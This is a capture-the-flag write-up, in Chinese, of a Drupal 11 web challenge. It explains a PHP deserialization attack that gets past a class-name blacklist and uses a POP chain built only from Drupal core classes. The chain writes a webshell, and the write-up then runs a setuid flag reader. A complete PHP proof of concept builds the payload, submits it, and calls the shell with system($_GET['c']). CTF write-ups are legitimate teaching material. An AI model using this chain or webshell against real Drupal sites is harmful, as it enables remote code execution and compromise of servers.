# Crack a Little Smile

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器题（Docker） |
| 附件 | 无（题目仅提供靶机） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

## 2. 题目分析

### 站点指纹与环境

环境为 Drupal 11.4.11、PHP 8.3.36、nginx + php-fpm。首页是 Drupal 11 站点「远航星·频率观测终端」，页脚标注 `Drupal 11.4.11 · PHP 8.3`，响应头带 `X-Generator: Drupal 11`。

### 功能与接口

页面围绕「观测档案」：

- 填写观测代号、观测日志、接收频段、存在状态；
- 点击「生成频录码」，前端调用 `POST /api/presets/export`；
- 在「另一台终端」粘贴频录码，调用 `POST /api/presets/import` 恢复档案。

接口由 `/static/js/resonance.js` 暴露：

```js
var data = await postJson("/api/presets/export", currentRecord());
// ...
var data = await postJson("/api/presets/import", { code: code });
```

题目描述反复提到「保存频录码，在另一台终端重建她的存在」，频录码即 PHP `serialize()` 的结果。

### 频录码数据格式

向 `/api/presets/export` 发送：

```json
{"codename":"test01","fieldNote":"hello world test","band":"band-01","signalProfile":"clean"}
```

返回：

```json
{"ok":true,"code":"TzoyMjoiUmVzb25hbmNlQXJjaGl2ZVByZXNldCI6...","preset":{...}}
```

对 `code` 解 base64：

```text
O:22:"ResonanceArchivePreset":5:{
  s:13:"formatVersion";s:19:"resonance-archive/1";
  s:8:"codename";s:6:"test01";
  s:9:"fieldNote";s:16:"hello world test";
  s:4:"band";s:7:"band-01";
  s:13:"signalProfile";s:5:"clean";
}
```

`/api/presets/import` 的流程：

1. base64 解码；
2. 对解码后的字符串做 provider 检查；
3. `unserialize()`；
4. `instanceof ResonanceArchivePreset` 校验；
5. 逐字段校验并返回。

### 反序列化 sink 与错误分类

典型 PHP 对象注入 sink：`unserialize()` 不限制可实例化类，`__wakeup` / `__destruct` 在类型检查之前触发。

| 输入 | error |
| --- | --- |
| base64 损坏 | `damaged_code` |
| 顶层不是目标类 | `unsupported_preset_type` |
| 内嵌类来自被禁 provider | `unsupported_provider` |
| 缺字段 | `incomplete_preset` |
| 属性类型不对 / 解析异常 | `unreadable_preset` |
| 字段值不在允许范围 | `invalid_preset` |
| formatVersion 不对 | `unsupported_version` |

### Drupal 11 / PHP 8.3 环境要点

- **自动加载全程可用**：`unserialize()` 遇到 `O:` / `C:` 中的类名会触发 Composer autoloader，`web/core`、`web/vendor` 下的类都能实例化，可用 gadget 面等于整个代码库。
- **强类型属性**：核心与题目自定义类多声明了 `string`、`array` 或接口类型，类型不符会在属性赋值阶段抛 `TypeError`，这是 `unreadable_preset` 的主要来源；类型吻合时，gadget 可以塞进任何接口类型属性。
- **动态属性仅弃用不致命**：PHP 8.2 起给未声明属性赋值只发 `E_DEPRECATED`，不抛异常，因此在 `ResonanceArchivePreset` 上挂第六个属性仍能完成反序列化。
- **魔术方法时机**：`__wakeup` / `__unserialize` 在对象构造完成时立即执行，`__destruct` 在对象图释放时执行，两者都早于 `instanceof` 与逐字段校验，业务层返回什么错误都不影响 gadget 执行。

### 构造 Drupal 原生 POP 链

#### Sink：Container::get()

`Drupal\Component\DependencyInjection\Container::get()` 保留了运行期反序列化：

```php
public function get(string $id, int $invalid_behavior = ...): ?object {
    $definition = $this->serviceDefinitions[$id] ?? NULL;
    if (!$definition) {
        // ...
    }
    if (isset($definition[0])) {
        $definition = unserialize($definition);
    }
    $service = $this->createService($definition, $id);
    return $service;
}

protected function createService(array $definition, $id) {
    // ...
    if (isset($definition['factory'])) {
        $factory = $definition['factory'];
        // ...
        $service = call_user_func_array($factory, $arguments);
    }
    // ...
}
```

只要让 `$this->cache->get($cid)` 调到这个 Container，且 `serviceDefinitions[$cid]` 是攻击者可控的序列化字符串，就能通过 `factory + arguments` 调用任意函数。

#### 入口：CacheCollector 与 YamlCacheCollectorDiscovery

核心代码中存在可控对象的 `get()` 调用：

```php
// Drupal\Core\Cache\CacheCollector
protected function updateCache($lock = TRUE) {
    // ...
    $cid = $this->getCid();
    $lock_name = $cid . ':' . __CLASS__;
    if (!$lock || $this->lock->acquire($lock_name)) {
        if ($cache = $this->cache->get($cid, $this->cacheInvalidated)) {
            // ...
        }
    }
}

public function destruct() {
    $this->updateCache();
    $this->reset();
}
```

其中：

- `$this->cache` 完全可控；
- `$this->lock` 完全可控；
- `$this->cid` 可控，基类 `getCid()` 直接返回 `$this->cid`；
- `updateCache()` 的前置条件可以用 `keysToPersist` / `storage` 满足；
- `lock->acquire()` 用 `Drupal\Core\Lock\NullLockBackend`，其 `acquire()` 永远返回 `TRUE`。

销毁入口由 `YamlCacheCollectorDiscovery` 提供：

```php
// Drupal\Core\Discovery\YamlCacheCollectorDiscovery
public function __destruct() {
    $this->yamlCacheCollector->destruct();
}
```

它的属性 `yamlCacheCollector` 类型是 `CacheCollectorInterface`，放入 `Drupal\Core\State\State`（继承自 `CacheCollector`）即可。

#### 完整调用链

```text
ResonanceArchivePreset（5 个合法字段 + 额外属性 x）
└─ Drupal\Core\Discovery\YamlCacheCollectorDiscovery::__destruct()
   └─ $yamlCacheCollector->destruct()            // Drupal\Core\State\State
      └─ CacheCollector::destruct() → updateCache()
         ├─ $this->lock->acquire()               // NullLockBackend → TRUE
         └─ $this->cache->get($cid, false)       // cache = Drupal\Component\DependencyInjection\Container
            └─ Container::get($cid)
               └─ unserialize($this->serviceDefinitions[$cid])
                  └─ createService()
                     └─ call_user_func_array($factory, $arguments)
```

链上的类名全部是 `Drupal\...`，不会命中 `Symfony` / `Guzzle` / `Doctrine` 黑名单。

`Container::get()` 的返回类型是 `?object`，factory 返回 int（例如 `file_put_contents` 返回写入字节数）时会在返回阶段抛 `TypeError`，但副作用已经发生。

#### 关键属性

- `Container`：`serviceDefinitions['qwb_cid']` 放一段序列化数组，`factory` 为 `file_put_contents`，`arguments` 为写入路径与内容；
- `State`：`cid` 设为 `qwb_cid`，与键名对应；`cache` 指向该 `Container`，`lock` 为 `NullLockBackend`；`keysToPersist` / `storage` 满足 `updateCache()` 前置条件，其余 `CacheCollector` 状态属性一并赋值；
- `YamlCacheCollectorDiscovery`：`yamlCacheCollector` 指向该 `State`。

#### 魔术方法选择

Drupal core 中可用的魔术方法分三类：

| 魔术方法 | 代表类 | 可用性 |
| --- | --- | --- |
| `__destruct` | `YamlCacheCollectorDiscovery`、`FileCookieJar` | 前者可用，后者被 shim 废掉 |
| `__wakeup` | `FnStream`、`FileCookieJar` | 抛异常或被改写，不可用 |
| `__toString` | 大量 value object | 需要字符串上下文，单独不成链 |

关键在于 `CacheCollector` 把清理逻辑放在普通方法 `destruct()` 而不是 `__destruct()` 里，所以必须有一个析构时主动调用 `destruct()` 的桥。`YamlCacheCollectorDiscovery::__destruct()` 只做这一件事，且属性类型是接口 `CacheCollectorInterface`，`State` 天然满足。

`Container::get()` 侧有三个前提：

- `serviceDefinitions` 是 protected 数组，键必须与 `$cid` 完全一致；
- 值必须是字符串，`isset($definition[0])` 对非空字符串恒为真，才会进入 `unserialize()`；
- 内层必须序列化成数组，因为 `createService(array $definition, $id)` 带数组类型约束，`factory` 与 `arguments` 会原样交给 `call_user_func_array()`。

因此整条链是两次反序列化：外层由请求提交，内层藏在 `serviceDefinitions` 里，由 `Container` 运行期解开，payload 中会出现嵌套的 `s:<len>:"a:2:{...}"`。

## 3. 解题过程

### provider 过滤

正式 `unserialize()` 之前，程序对 base64 解码后的原始字符串做子串匹配。实测：

- 类名写 `GuzzleHttp\Psr7\PumpStream` → `unsupported_provider: GuzzleHttp`；
- 改成全小写 `guzzlehttp\psr7\pumpstream` → 仍被识别为 `GuzzleHttp`；
- 加前导反斜杠 `\GuzzleHttp\...` → 仍被识别；
- 类名只出现在字符串字面量里 → 也会被拦截，说明是原始文本扫描，不是语法解析；
- `C:` 自定义序列化内嵌同样会被扫到。

黑名单包括 `Symfony`、`Guzzle`、`GuzzleHttp`、`Doctrine`；`Drupal`、`Twig`、`PEAR` 等放行。phpggc 中最顺手的 Guzzle / Symfony 链全部不可用，只能寻找 Drupal 原生链。

### 字段类型限制与动态属性

把 `codename` 等字段换成 int、bool、null、数组或对象都会得到 `unreadable_preset`，只有字符串能走完解析。因此 gadget 不能放进这五个字段，但可以在顶层对象上挂一个额外动态属性 `x` 携带 gadget。该属性只触发 `E_DEPRECATED`，不会中断反序列化；业务校验会返回 `unreadable_preset`，但此时对象已构造完成，请求结束释放对象时 `__destruct()` 照常执行。

### vendor 侧加固

Drupal 11.4.11 在 `core/includes/guzzle_file_cookie_jar_shim.php` 中重定义了 Guzzle 的 `FileCookieJar`：

```php
private bool $autoSave = true;

public function __wakeup(): void {
    $this->autoSave = false;
}
```

这堵住了经典 Drupal 链入口 `FileCookieJar::__destruct → save → __toString`；同时 `GuzzleHttp\Psr7\FnStream::__wakeup()` 直接抛 `LogicException`。两条常规入口都被封死。

### 黑名单边界

- 扫描发生在 base64 解码之后、`unserialize()` 之前，比较对象是原始序列化文本，payload 必须语法完整；
- 类名在序列化文本里是明文（如 `O:27:"Drupal\Core\State\State"`），无法在类名位置转义，黑名单等价于对 gadget 类名做粗粒度过滤；
- 大小写、前导反斜杠会被归一化后匹配，常规变形无效；
- 会抛异常的 `__wakeup`（如 `FnStream`）不能出现在对象图里，哪怕只是被嵌套，也会让整个 `unserialize()` 失败。

### 触发反序列化并写入 webshell

将 gadget 对象作为额外属性 `x` 拼进顶层 `ResonanceArchivePreset`，base64 后 POST 到 `/api/presets/import`。请求返回 `unreadable_preset`，但对象已经反序列化完成；请求结束时对象释放，`YamlCacheCollectorDiscovery::__destruct()` 启动整条链，最终执行 `call_user_func_array('file_put_contents', [...])`，向 `/opt/drupal/web/sites/default/files/qwb.php` 写入 webshell。

`file_put_contents` 返回写入字节数，`Container::get()` 在返回阶段抛 `TypeError`，但文件已经落盘，异常不影响利用结果。

### 读取 flag

Web 根目录 `/opt/drupal/web` 及其下的 `sites/default/files` 对 `www-data` 可写；服务是 nginx + php-fpm，Drupal 放在 `files/.htaccess` 里的 PHP 执行限制只对 Apache 生效，nginx 会正常解析该目录下的 `.php`。访问：

```text
http://<target>/sites/default/files/qwb.php?c=/readflag
```

webshell 先输出 `SHELLOK:`，再执行 `system('/readflag')`。`/flag.txt` 权限为 `400 root`，`www-data` 无法直接读取；根目录的 `/readflag` 是 setuid root，直接执行即可输出题目 flag。响应体出现 `SHELLOK:` 与 flag 即完成闭环。

## 4. PoC

```php
<?php
use Drupal\Component\DependencyInjection\Container;
use Drupal\Core\Discovery\YamlCacheCollectorDiscovery;
use Drupal\Core\Lock\NullLockBackend;
use Drupal\Core\State\State;

require __DIR__ . '/autoload.php';

function setProtected(object $obj, string $class, string $prop, mixed $value): void {
    $rp = new ReflectionProperty($class, $prop);
    $rp->setAccessible(TRUE);
    $rp->setValue($obj, $value);
}

$shell = '<?php echo "SHELLOK:"; echo system($_GET["c"]); ?>';

$container = (new ReflectionClass(Container::class))->newInstanceWithoutConstructor();
setProtected($container, Container::class, 'serviceDefinitions', [
    'qwb_cid' => serialize([
        'factory' => 'file_put_contents',
        'arguments' => ['/opt/drupal/web/sites/default/files/qwb.php', $shell],
    ]),
]);

$state = (new ReflectionClass(State::class))->newInstanceWithoutConstructor();
setProtected($state, State::class, 'cid', 'qwb_cid');
setProtected($state, State::class, 'cache', $container);
setProtected($state, State::class, 'lock', new NullLockBackend());
setProtected($state, State::class, 'keysToPersist', ['k' => TRUE]);
setProtected($state, State::class, 'storage', ['k' => 'v']);
setProtected($state, State::class, 'cacheCreated', NULL);
setProtected($state, State::class, 'cacheInvalidated', FALSE);
setProtected($state, State::class, 'cacheLoaded', FALSE);
setProtected($state, State::class, 'tags', []);

$discovery = (new ReflectionClass(YamlCacheCollectorDiscovery::class))->newInstanceWithoutConstructor();
setProtected($discovery, YamlCacheCollectorDiscovery::class, 'yamlCacheCollector', $state);

$base = 'http://TARGET';

$payload = 'O:22:"ResonanceArchivePreset":6:{'
    . 's:13:"formatVersion";s:19:"resonance-archive/1";'
    . 's:8:"codename";s:6:"test01";'
    . 's:9:"fieldNote";s:5:"hello";'
    . 's:4:"band";s:7:"band-01";'
    . 's:13:"signalProfile";s:5:"clean";'
    . 's:1:"x";' . serialize($discovery)
    . '}';

$ch = curl_init("$base/api/presets/import");
curl_setopt_array($ch, [
    CURLOPT_POST => TRUE,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode(['code' => base64_encode($payload)]),
    CURLOPT_RETURNTRANSFER => TRUE,
]);
$resp = curl_exec($ch);
curl_close($ch);
echo $resp, PHP_EOL;

echo file_get_contents("$base/sites/default/files/qwb.php?c=/readflag"), PHP_EOL;
```
